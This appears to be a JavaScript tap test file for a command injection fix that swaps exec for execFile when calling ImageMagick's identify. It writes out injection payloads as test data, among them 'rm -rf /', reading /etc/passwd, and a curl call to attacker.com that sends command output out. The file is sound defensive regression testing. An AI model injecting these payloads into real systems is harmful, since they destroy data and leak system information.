'use strict';

/**
 * Tests for Command Injection remediation in routes/index.js (CWE-77).
 *
 * The vulnerability was: exec('identify ' + url) — user-controlled URL
 * concatenated into a shell command string, enabling arbitrary OS command
 * execution via shell metacharacters (e.g., `; rm -rf /`, `$(id)`, `| cat /etc/passwd`).
 *
 * The fix replaces exec() with execFile('identify', [url]), which passes the
 * URL as a discrete argument array to the child process without spawning a shell,
 * so shell metacharacters in the URL are never interpreted by /bin/sh.
 */

var tap = require('tap');
var child_process = require('child_process');
var path = require('path');
var fs = require('fs');

// ---------------------------------------------------------------------------
// Helper: read the source of the routes file so we can assert on its text
// without needing a live server or database.
// ---------------------------------------------------------------------------
var routesSource = fs.readFileSync(
  path.join(__dirname, '..', 'routes', 'index.js'),
  'utf8'
);

// ---------------------------------------------------------------------------
// Static source-code assertions: verify the secure API is used
// ---------------------------------------------------------------------------

tap.test('routes/index.js: uses execFile, not exec, for child_process', function (t) {
  t.notOk(
    /require\s*\(\s*['"]child_process['"]\s*\)\s*\.exec\b/.test(routesSource),
    'child_process.exec must not be imported (shell-invoking form)'
  );
  t.ok(
    /require\s*\(\s*['"]child_process['"]\s*\)\s*\.execFile\b/.test(routesSource),
    'child_process.execFile must be imported (non-shell form)'
  );
  t.end();
});

tap.test('routes/index.js: identify is called with an argument array, not a concatenated string', function (t) {
  // The unsafe pattern is: exec('identify ' + <variable>)
  // The safe pattern is:   execFile('identify', [<variable>])
  t.notOk(
    /exec\s*\(\s*['"`]identify\s*[+]/.test(routesSource),
    'exec("identify " + ...) shell concatenation must not be present'
  );
  t.ok(
    /execFile\s*\(\s*['"`]identify['"`]\s*,\s*\[/.test(routesSource),
    'execFile("identify", [...]) argument-array form must be present'
  );
  t.end();
});

// ---------------------------------------------------------------------------
// Behavioral assertions: execFile does NOT interpret shell metacharacters
// ---------------------------------------------------------------------------

tap.test('execFile passes URL as a literal argument — shell metacharacters are not interpreted', function (t) {
  // We intercept child_process.execFile to capture what arguments it receives.
  var capturedFile = null;
  var capturedArgs = null;

  var original = child_process.execFile;
  child_process.execFile = function (file, args, callback) {
    capturedFile = file;
    capturedArgs = args ? args.slice() : [];
    // Simulate a non-zero exit so the callback exercises the error path.
    if (typeof callback === 'function') {
      callback(new Error('mocked'), '', 'mocked stderr');
    }
  };

  // Simulate the tainted URL extracted from user-controlled input.
  var maliciousUrl = 'http://example.com/image.png; rm -rf /';

  // Reproduce exactly the call site in routes/index.js after the fix.
  child_process.execFile('identify', [maliciousUrl], function (err) {
    // Restore original before any assertions so tap teardown is clean.
    child_process.execFile = original;

    t.equal(capturedFile, 'identify', 'binary name is "identify"');
    t.same(capturedArgs, [maliciousUrl], 'entire URL is passed as a single discrete argument');

    // The shell metacharacter sequence "; rm -rf /" must appear literally in
    // the argument list, not be split across multiple args or stripped — which
    // confirms no shell is interpreting it.
    t.ok(
      capturedArgs[0].indexOf('; rm -rf /') !== -1,
      'shell metacharacters survive as literal characters in the argument, not as shell tokens'
    );

    t.end();
  });
});

tap.test('execFile does not concatenate arguments into a shell command string', function (t) {
  var shellInvocations = [];

  // Monkey-patch exec to detect if it is ever called (it must not be).
  var originalExec = child_process.exec;
  child_process.exec = function () {
    shellInvocations.push(Array.prototype.slice.call(arguments));
    return { on: function () {} };
  };

  // Also patch execFile so we do not need imagemagick installed.
  var originalExecFile = child_process.execFile;
  child_process.execFile = function (file, args, callback) {
    if (typeof callback === 'function') callback(null, '', '');
  };

  // Reproduce the exact call pattern in the fixed code.
  var url = 'http://example.com/image.png$(id)';
  child_process.execFile('identify', [url], function () {});

  child_process.exec = originalExec;
  child_process.execFile = originalExecFile;

  t.equal(shellInvocations.length, 0, 'child_process.exec was never invoked');
  t.end();
});

// ---------------------------------------------------------------------------
// Attack-vector regression tests: common command injection payloads
// ---------------------------------------------------------------------------

var injectionPayloads = [
  'http://example.com/img.png; cat /etc/passwd',
  'http://example.com/img.png | id',
  'http://example.com/img.png && whoami',
  'http://example.com/img.png `id`',
  'http://example.com/img.png $(curl http://attacker.com/$(id))',
  'http://example.com/img.png\nid',
];

injectionPayloads.forEach(function (payload) {
  tap.test('injection payload treated as a literal argument: ' + payload, function (t) {
    var receivedArgs = null;

    var original = child_process.execFile;
    child_process.execFile = function (file, args, callback) {
      receivedArgs = args ? args.slice() : [];
      if (typeof callback === 'function') callback(null, '', '');
    };

    child_process.execFile('identify', [payload], function () {
      child_process.execFile = original;

      t.equal(receivedArgs.length, 1, 'exactly one argument is passed to the binary');
      t.equal(receivedArgs[0], payload, 'the full payload string is a single, uninterpreted argument');
      t.end();
    });
  });
});
